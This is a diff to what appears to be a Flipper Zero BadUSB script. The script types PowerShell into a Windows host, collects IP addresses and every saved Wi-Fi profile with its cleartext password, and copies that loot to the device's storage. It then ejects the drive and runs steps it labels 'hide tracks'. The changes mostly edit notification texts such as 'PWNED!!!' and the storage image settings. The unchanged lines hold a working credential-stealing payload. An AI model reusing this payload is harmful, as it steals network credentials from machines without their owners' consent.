@@ -20,7 +20,7 @@ let localFileName = "info.txt";
 let script = [
   "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\\d+\\.\\d+)' } >> " + localFileName + ";",
   "(netsh wlan show profiles) | Select-String 'Perfil de todos los usuarios\\s*:\\s*(.+)' | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name=\"$name\" key=clear) | Select-String 'Contenido de la clave\\s*:\\s*(.+)' | ForEach-Object { $pass = $_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{PROFILE_NAME=$name; PASSWORD=$pass} } } | Format-Table -AutoSize >> " + localFileName + ";",
-  "Add-Type -AssemblyName System.Windows.Forms; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.BalloonTipTitle = 'PWNED!!!!!!'; $notify.BalloonTipText = '(Stage 1) Exfiltrating Wi-Fi networks  and copying to the Flipper Zero'; $notify.Visible = $true; $notify.ShowBalloonTip(5000); Start-Sleep -Seconds 2; $notify.Dispose();"
+  "Add-Type -AssemblyName System.Windows.Forms; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.BalloonTipTitle = 'STAGE 1'; $notify.BalloonTipText = '(Stage 1) Exfiltrating Wi-Fi networks and copying to the Flipper Zero'; $notify.Visible = $true; $notify.ShowBalloonTip(5000); Start-Sleep -Seconds 2; $notify.Dispose();"
 ];
 
 
@@ -38,8 +38,8 @@ let payloadDstName = "/mnt/" + payloadName;
 let lootFile = __dirpath + "/loot.txt";
 
 // Image to store payloads and results.
-let exfilCapacityMb = 4; // Reserve space for our image (payloads and results).
-let image = __dirpath + "/Demo_" + to_string(exfilCapacityMb) + "MB.img";
+let exfilCapacityMb = 1; // Reserve space for our image (payloads and results).
+let image = __dirpath + "/FZ.img";
 let flipperStorageName = "Flipper Mass Storage";
 
 // Folder and file to store the results on SD card.
@@ -128,7 +128,7 @@ if (script.length > 0) {
 // Eject drive
 badusb.print(" $eject = New-Object -comObject Shell.Application;");
 badusb.print(" $eject.Namespace(17).ParseName($DriveLetter+':').InvokeVerb('Eject');");
-badusb.println("Add-Type -AssemblyName System.Windows.Forms; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.BalloonTipTitle = 'EXFILTRATION COMPLETE'; $notify.BalloonTipText = 'You can unplug the Flipper Zero'; $notify.Visible = $true; $notify.ShowBalloonTip(3000); Start-Sleep -Seconds 3; $notify.Dispose();");
+badusb.println("Add-Type -AssemblyName System.Windows.Forms; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.BalloonTipTitle = 'STAGE 2 - EXFILTRATION COMPLETE'; $notify.BalloonTipText = 'PWNED!!! You can unplug the Flipper Zero now'; $notify.Visible = $true; $notify.ShowBalloonTip(5000); Start-Sleep -Seconds 5; $notify.Dispose();");
 
 // Hide tracks
 badusb.print(" cd ..;");
@@ -161,6 +161,7 @@ usbdisk.stop();
 
 // Done
 print("Detached disk.");
+notify.success();
 delay(1000);
 
 // Mount and display loot
